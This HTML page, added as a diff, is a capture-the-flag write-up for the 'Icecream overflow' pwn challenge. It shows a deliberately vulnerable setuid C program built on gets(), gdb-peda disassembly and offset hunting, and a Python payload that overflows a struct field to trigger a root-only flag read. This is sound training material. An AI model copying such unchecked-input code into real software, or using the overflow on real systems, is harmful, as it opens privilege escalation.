@@ -1,0 +1,307 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Writeups</title>
+        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
+        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({
+                tex2jax: {
+                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
+                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
+                    processEscapes: true
+                },
+                config: ["MMLorHTML.js"],
+                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
+                extensions: ["MathMenu.js", "MathZoom.js"]
+            });
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
+    </head>
+    <body>
+        <div id="navbar">
+            <a href="/CTF-writeups" id="root-link">
+                <h2>Rektedekte</h2>
+            </a>
+            <ul id="nav-links">
+				<li><a href="/CTF-writeups/search" class="no-flash">
+					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
+				</a></li>
+                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
+                </a></li>
+                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
+                </a></li>
+                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
+                </a></li>
+            </ul>
+        </div>
+        
+    <div id="content">
+        <h3>
+            <a href="/CTF-writeups\Gymnasie-mesterskaberne 2022">Gymnasie-mesterskaberne 2022</a>
+            <a href="/CTF-writeups\Gymnasie-mesterskaberne 2022\Icecream overflow/files.zip" class="text-right">Download</a>
+        </h3>
+        <h1>
+            <span>Icecream overflow</span>
+            <span class="text-right">[None]</span>
+        </h1>
+        <hr>
+        
+            
+    <div class="tags">
+        
+            
+                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
+            
+        
+    </div>
+
+        
+        
+            <div id="markdown">
+                <p><code>*CHALL-TEXT*</code></p>
+<h2>Code</h2>
+<p>In this challenge, we are given access to a server with two files: <em>icecream-shop</em> and its source code <em>icecream-shop.c</em>. As we already have the source code, there is no point in reverse engineering the binary.</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+
+<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">customer</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">favorite_icecream</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">amount_of_icecream</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">our_relationship</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span><span class="w"></span>
+<span class="p">}</span><span class="w"> </span><span class="n">customer</span><span class="p">;</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// execute as root; don&#39;t drop privileges</span>
+<span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">customer</span><span class="w"> </span><span class="n">newcustomer</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">newcustomer</span><span class="p">.</span><span class="n">our_relationship</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;my new favourite client&quot;</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Good afternoon and welcome to my ice cream shop!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">fputs</span><span class="p">(</span><span class="s">&quot;What&#39;s your name, friend? &quot;</span><span class="p">,</span><span class="w"> </span><span class="n">stdout</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">newcustomer</span><span class="p">.</span><span class="n">name</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Lovely to meet you, %s! Now, what ice cream would you like? &quot;</span><span class="p">,</span><span class="w"> </span><span class="n">newcustomer</span><span class="p">.</span><span class="n">name</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">newcustomer</span><span class="p">.</span><span class="n">favorite_icecream</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">fputs</span><span class="p">(</span><span class="s">&quot;A fine choice! How much would you like? &quot;</span><span class="p">,</span><span class="w"> </span><span class="n">stdout</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">newcustomer</span><span class="p">.</span><span class="n">amount_of_icecream</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">newcustomer</span><span class="p">.</span><span class="n">our_relationship</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;my boss&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Oh, boss, it&#39;s you! Didn&#39;t recognize ya there!&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Here, have all the ice cream you want!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;cat /root/flag.txt&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Anything for %s! Here you go:</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">newcustomer</span><span class="p">.</span><span class="n">our_relationship</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;             </span><span class="se">\n</span><span class="s">\</span>
+<span class="s">                   ,&#39; `,.  </span><span class="se">\n</span><span class="s">\</span>
+<span class="s">                   &gt;-.(__) </span><span class="se">\n</span><span class="s">\</span>
+<span class="s">                  (_,-&#39; |  </span><span class="se">\n</span><span class="s">\</span>
+<span class="s">                    `.  |  </span><span class="se">\n</span><span class="s">\</span>
+<span class="s">                      `.|  </span><span class="se">\n</span><span class="s">\</span>
+<span class="s">                        `  </span><span class="se">\n</span><span class="s">\</span>
+<span class="s">        &quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>In the program, we have a structure by the name of <code>customer</code> and a form to fill it with data. The program then calls <code>strcmp</code> to check if <code>newcustomer.our_relationship == "my boss"</code>. As the program sets this value itself, we should not be able to modify it. Looking closely at the <code>gets</code>-calls, they are entirely unsafe, as they don't specify a length. With a buffer size of 100 for each of the properties, we should be able to cause a buffer overflow.</p>
+<hr />
+<h2>Analysis</h2>
+<p>Downloading the original binary to our computer using the following command:<br />
+<code>scp -r haaukins@icecream.hkn:icecream-shop icecream-shop</code><br />
+we can analyse the executable. I'll be using gdb-peda.</p>
+<p>With the <code>checksec</code> command, we can check for the presence of any form of protection:</p>
+<div class="codehilite"><pre><span></span><code>gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : Partial
+</code></pre></div>
+
+<p>PIE would be a problem, depending on what we wanted to do, but if we can simply overwrite the value of <code>our_relationship</code> we won't have to worry about that. Disassembling the main function yields this:</p>
+<div class="codehilite"><pre><span></span><code>gdb-peda$ disas main
+Dump of assembler code for function main:
+   0x0000000000001195 &lt;+0&gt;:     push   rbp
+   0x0000000000001196 &lt;+1&gt;:     mov    rbp,rsp
+   0x0000000000001199 &lt;+4&gt;:     sub    rsp,0x190
+   0x00000000000011a0 &lt;+11&gt;:    mov    edi,0x0
+   0x00000000000011a5 &lt;+16&gt;:    call   0x1090 &lt;setuid@plt&gt;
+   0x00000000000011aa &lt;+21&gt;:    lea    rax,[rbp-0x190]
+   0x00000000000011b1 &lt;+28&gt;:    add    rax,0x12c
+   0x00000000000011b7 &lt;+34&gt;:    movabs rdx,0x662077656e20796d
+   0x00000000000011c1 &lt;+44&gt;:    movabs rcx,0x65746972756f7661
+   0x00000000000011cb &lt;+54&gt;:    mov    QWORD PTR [rax],rdx
+   0x00000000000011ce &lt;+57&gt;:    mov    QWORD PTR [rax+0x8],rcx
+   0x00000000000011d2 &lt;+61&gt;:    movabs rdx,0x746e65696c6320
+   0x00000000000011dc &lt;+71&gt;:    mov    QWORD PTR [rax+0x10],rdx
+   0x00000000000011e0 &lt;+75&gt;:    lea    rdi,[rip+0xe21]        # 0x2008
+   0x00000000000011e7 &lt;+82&gt;:    call   0x1030 &lt;puts@plt&gt;
+   0x00000000000011ec &lt;+87&gt;:    mov    rax,QWORD PTR [rip+0x2e6d]        # 0x4060 &lt;stdout@GLIBC_2.2.5&gt;
+   0x00000000000011f3 &lt;+94&gt;:    mov    rcx,rax
+   0x00000000000011f6 &lt;+97&gt;:    mov    edx,0x1a
+   0x00000000000011fb &lt;+102&gt;:   mov    esi,0x1
+   0x0000000000001200 &lt;+107&gt;:   lea    rdi,[rip+0xe33]        # 0x203a
+   0x0000000000001207 &lt;+114&gt;:   call   0x1080 &lt;fwrite@plt&gt;
+   0x000000000000120c &lt;+119&gt;:   lea    rax,[rbp-0x190]
+   0x0000000000001213 &lt;+126&gt;:   mov    rdi,rax
+   0x0000000000001216 &lt;+129&gt;:   mov    eax,0x0
+   0x000000000000121b &lt;+134&gt;:   call   0x1070 &lt;gets@plt&gt;
+   0x0000000000001220 &lt;+139&gt;:   lea    rax,[rbp-0x190]
+   0x0000000000001227 &lt;+146&gt;:   mov    rsi,rax
+   0x000000000000122a &lt;+149&gt;:   lea    rdi,[rip+0xe27]        # 0x2058
+   0x0000000000001231 &lt;+156&gt;:   mov    eax,0x0
+   0x0000000000001236 &lt;+161&gt;:   call   0x1050 &lt;printf@plt&gt;
+   0x000000000000123b &lt;+166&gt;:   lea    rax,[rbp-0x190]
+   0x0000000000001242 &lt;+173&gt;:   add    rax,0x64
+   0x0000000000001246 &lt;+177&gt;:   mov    rdi,rax
+   0x0000000000001249 &lt;+180&gt;:   mov    eax,0x0
+   0x000000000000124e &lt;+185&gt;:   call   0x1070 &lt;gets@plt&gt;
+   0x0000000000001253 &lt;+190&gt;:   mov    rax,QWORD PTR [rip+0x2e06]        # 0x4060 &lt;stdout@GLIBC_2.2.5&gt;
+   0x000000000000125a &lt;+197&gt;:   mov    rcx,rax
+   0x000000000000125d &lt;+200&gt;:   mov    edx,0x28
+   0x0000000000001262 &lt;+205&gt;:   mov    esi,0x1
+   0x0000000000001267 &lt;+210&gt;:   lea    rdi,[rip+0xe2a]        # 0x2098
+   0x000000000000126e &lt;+217&gt;:   call   0x1080 &lt;fwrite@plt&gt;
+   0x0000000000001273 &lt;+222&gt;:   lea    rax,[rbp-0x190]
+   0x000000000000127a &lt;+229&gt;:   add    rax,0xc8
+   0x0000000000001280 &lt;+235&gt;:   mov    rdi,rax
+   0x0000000000001283 &lt;+238&gt;:   mov    eax,0x0
+   0x0000000000001288 &lt;+243&gt;:   call   0x1070 &lt;gets@plt&gt;
+   0x000000000000128d &lt;+248&gt;:   lea    rdi,[rip+0xe2d]        # 0x20c1
+   0x0000000000001294 &lt;+255&gt;:   call   0x1030 &lt;puts@plt&gt;
+   0x0000000000001299 &lt;+260&gt;:   lea    rax,[rbp-0x190]
+   0x00000000000012a0 &lt;+267&gt;:   add    rax,0x12c
+   0x00000000000012a6 &lt;+273&gt;:   lea    rsi,[rip+0xe15]        # 0x20c2
+   0x00000000000012ad &lt;+280&gt;:   mov    rdi,rax
+   0x00000000000012b0 &lt;+283&gt;:   call   0x1060 &lt;strcmp@plt&gt;
+   0x00000000000012b5 &lt;+288&gt;:   test   eax,eax
+   0x00000000000012b7 &lt;+290&gt;:   jne    0x12df &lt;main+330&gt;
+   0x00000000000012b9 &lt;+292&gt;:   lea    rdi,[rip+0xe10]        # 0x20d0
+   0x00000000000012c0 &lt;+299&gt;:   call   0x1030 &lt;puts@plt&gt;
+   0x00000000000012c5 &lt;+304&gt;:   lea    rdi,[rip+0xe34]        # 0x2100
+   0x00000000000012cc &lt;+311&gt;:   call   0x1030 &lt;puts@plt&gt;
+   0x00000000000012d1 &lt;+316&gt;:   lea    rdi,[rip+0xe50]        # 0x2128
+   0x00000000000012d8 &lt;+323&gt;:   call   0x1040 &lt;system@plt&gt;
+   0x00000000000012dd &lt;+328&gt;:   jmp    0x130c &lt;main+375&gt;
+   0x00000000000012df &lt;+330&gt;:   lea    rax,[rbp-0x190]
+   0x00000000000012e6 &lt;+337&gt;:   add    rax,0x12c
+   0x00000000000012ec &lt;+343&gt;:   mov    rsi,rax
+   0x00000000000012ef &lt;+346&gt;:   lea    rdi,[rip+0xe4a]        # 0x2140
+   0x00000000000012f6 &lt;+353&gt;:   mov    eax,0x0
+   0x00000000000012fb &lt;+358&gt;:   call   0x1050 &lt;printf@plt&gt;
+   0x0000000000001300 &lt;+363&gt;:   lea    rdi,[rip+0xe59]        # 0x2160
+   0x0000000000001307 &lt;+370&gt;:   call   0x1030 &lt;puts@plt&gt;
+   0x000000000000130c &lt;+375&gt;:   mov    eax,0x0
+   0x0000000000001311 &lt;+380&gt;:   leave  
+   0x0000000000001312 &lt;+381&gt;:   ret    
+End of assembler dump.
+</code></pre></div>
+
+<p>The section of interest is the lines right before <code>0x00000000000012b0</code>, where the location of the string "my boss" and the value of <code>our_relationship</code> is put into rsi and rdi respectively. A few lines earlier, rax is declared to be <code>rbp-0x190</code>, with the next line adding <code>0x12c</code> to that value. Given that the prompt for a name is writen to <code>0x190</code>, we should be able to overwrite <code>our_relationship</code>. Without bothering to calculate the offset, we will simply get gdp-peda to create a pattern, and we should be able to calculate the necesarry offset. As PIE is turned on, we need to run the program once, so that gdb can get a proper address for our breakpoint.</p>
+<hr />
+<h2>Overflowing the buffer</h2>
+<div class="codehilite"><pre><span></span><code>gdb-peda$ pattern create 500 test.txt
+Writing pattern of 500 chars to filename &quot;test.txt&quot;
+gdb-peda$ break *0x00005555555552b0
+Breakpoint 1 at 0x5555555552b0
+gdb-peda$ r &lt; test.txt
+Starting program: /home/kali/Desktop/icecream &lt; test.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+Good afternoon and welcome to my ice cream shop!
+
+What&#39;s your name, friend? Lovely to meet you, AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A! Now, what ice cream would you like? A fine choice! How much would you like? 
+[----------------------------------registers-----------------------------------]
+RAX: 0x7fffffffdebc (&quot;LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A&quot;)
+RBX: 0x0 
+RCX: 0x7ffff7cfa3f3 (&lt;__GI___libc_write+19&gt;:    cmp    rax,0xfffffffffffff000)
+RDX: 0x1 
+RSI: 0x5555555560c2 --&gt; 0x73736f6220796d (&#39;my boss&#39;)
+RDI: 0x7fffffffdebc (&quot;LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A&quot;)
+RBP: 0x7fffffffdf20 (&quot;A%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A&quot;)
+RSP: 0x7fffffffdd90 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...)
+RIP: 0x5555555552b0 (&lt;main+283&gt;:        call   0x555555555060 &lt;strcmp@plt&gt;)
+R8 : 0x7ffff7df6a50 --&gt; 0x0 
+R9 : 0x0 
+R10: 0x0 
+R11: 0x246 
+R12: 0x7fffffffe038 --&gt; 0x7fffffffe38b (&quot;/home/kali/Desktop/icecream&quot;)
+R13: 0x555555555195 (&lt;main&gt;:    push   rbp)
+R14: 0x0 
+R15: 0x7ffff7ffd020 --&gt; 0x7ffff7ffe2c0 --&gt; 0x555555554000 --&gt; 0x10102464c457f
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x5555555552a0 &lt;main+267&gt;:   add    rax,0x12c
+   0x5555555552a6 &lt;main+273&gt;:   lea    rsi,[rip+0xe15]        # 0x5555555560c2
+   0x5555555552ad &lt;main+280&gt;:   mov    rdi,rax
+=&gt; 0x5555555552b0 &lt;main+283&gt;:   call   0x555555555060 &lt;strcmp@plt&gt;
+   0x5555555552b5 &lt;main+288&gt;:   test   eax,eax
+   0x5555555552b7 &lt;main+290&gt;:   jne    0x5555555552df &lt;main+330&gt;
+   0x5555555552b9 &lt;main+292&gt;:   lea    rdi,[rip+0xe10]        # 0x5555555560d0
+   0x5555555552c0 &lt;main+299&gt;:   call   0x555555555030 &lt;puts@plt&gt;
+Guessed arguments:
+arg[0]: 0x7fffffffdebc (&quot;LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A&quot;)
+arg[1]: 0x5555555560c2 --&gt; 0x73736f6220796d (&#39;my boss&#39;)
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdd90 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...)
+0008| 0x7fffffffdd98 (&quot;ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%s&quot;...)
+0016| 0x7fffffffdda0 (&quot;AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%&quot;...)
+0024| 0x7fffffffdda8 (&quot;(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A&quot;...)
+0032| 0x7fffffffddb0 (&quot;A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;&quot;...)
+0040| 0x7fffffffddb8 (&quot;AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%&quot;...)
+0048| 0x7fffffffddc0 (&quot;bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA&quot;...)
+0056| 0x7fffffffddc8 (&quot;AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G&quot;...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x00005555555552b0 in main ()
+</code></pre></div>
+
+<p>The important part here is the "Guessed arguments" section. We can se that we do indeed have control of <code>our_relationship</code>. gdb-peda has a handy function for calculating the offset:</p>
+<div class="codehilite"><pre><span></span><code>gdb-peda$ pattern offset LA%hA%7
+LA%hA%7 found at offset: 300
+</code></pre></div>
+
+<p>So 300 bytes of padding, then our value, and we should be golden. Using python to create the payload:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;icecream.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;w+b&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">300</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;my boss&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>And then testing the payload locally:</p>
+<div class="codehilite"><pre><span></span><code>cat icecream.txt | ./icecream
+Good afternoon and welcome to my ice cream shop!
+
+What&#39;s your name, friend? Lovely to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAmy boss! Now, what ice cream would you like? A fine choice! How much would you like? 
+Oh, boss, it&#39;s you! Didn&#39;t recognize ya there!
+Here, have all the ice cream you want!
+
+cat: /root/flag.txt: Permission denied
+</code></pre></div>
+
+<p>We can see that it works. Uploading the file to the server:</p>
+<p><code>scp icecream.txt haaukins@icecream.hkn:exploit.txt</code></p>
+<p>We can now run the exploit on the server granting us the flag.</p>
+            </div>
+        
+        
+    </div>
+
+    </body>
+</html>
